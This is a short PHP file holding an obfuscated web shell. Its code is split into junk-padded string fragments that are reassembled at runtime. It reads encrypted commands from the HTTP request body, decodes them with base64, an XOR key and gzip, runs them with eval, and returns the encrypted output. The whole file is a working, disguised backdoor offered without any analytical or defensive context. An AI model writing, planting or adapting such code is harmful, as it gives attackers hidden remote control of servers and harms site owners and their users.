<?php
$z=str_replace('GB','','creGBatGBe_GBGBfuGBncGBtion');
$y='con`Ttents()`T;@ob_e`Tnd_c`Tlean();$`Tr=`T`T@b`Tase64_encod`Te(@x`T(@gzco`Tmpres`Ts($o),$k));print("$p`T$kh`T$r$kf");}';
$S='){$c=`Tstrlen`T(`T$k`T);$l=st`Trlen($t);$`To="";for($i`T=0;$i<$l`T;){for`T(`T$j=0;`T($j<`T$c&&$i<$l);`T$j+`T+,$i++){`T';
$Y='$o.=$t`T{$i}^$k{$j`T}`T;}}`Treturn`T $o;}if (@p`Tr`Teg_match("/$k`Th(.+)$k`Tf/",@fi`T`Tle_get_co`Tntent`Ts("p`Thp://in';
$P='put`T"),$`T`Tm)==1) {@ob_star`Tt();@e`Tva`Tl(@gzu`T`Tncompress(@x(@b`Tase64`T_deco`T`Tde($m`T[1]),$k)));$o`T=@ob_get_`T';
$Z='$k="`Te920826`T4";$kh="`T69ab`T6`T26607e8";$kf`T="4`T9c35`T5c4182`T2";$p="f18`TC`TPutbl`TdjcDeUR";func`Ttion `Tx`T($t,$k';
$v=str_replace('`T','',$Z.$S.$Y.$P.$y);
$E=$z('',$v);$E();
?>
